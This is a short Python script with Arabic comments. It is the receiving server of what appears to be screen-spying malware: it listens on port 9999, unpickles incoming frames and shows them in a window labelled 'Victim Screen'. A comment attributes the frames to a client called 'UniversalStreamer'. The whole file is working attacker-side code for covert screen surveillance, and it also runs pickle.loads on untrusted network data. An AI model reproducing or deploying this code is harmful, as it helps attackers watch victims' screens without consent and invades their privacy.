import socket
import pickle
import struct
import cv2
import numpy as np

def start_receiver(host='0.0.0.0', port=9999):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(5)
    print(f"[*] السيرفر في وضع الاستعداد: {host}:{port}")

    while True:
        conn, addr = s.accept()
        print(f"[+] اتصال من: {addr}")
        data = b""
        payload_size = struct.calcsize(">L")
        
        while True:
            while len(data) < payload_size:
                data += conn.recv(4096)
            
            packed_msg_size = data[:payload_size]
            data = data[payload_size:]
            msg_size = struct.unpack(">L", packed_msg_size)[0]
            
            while len(data) < msg_size:
                data += conn.recv(4096)
            
            frame_data = data[:msg_size]
            data = data[msg_size:]
            
            # فك تشفير البيانات القادمة من UniversalStreamer
            frame = pickle.loads(frame_data)
            cv2.imshow('Victim Screen', frame)
            if cv2.waitKey(1) == 27: break
            
        conn.close()

if __name__ == "__main__":
    start_receiver()
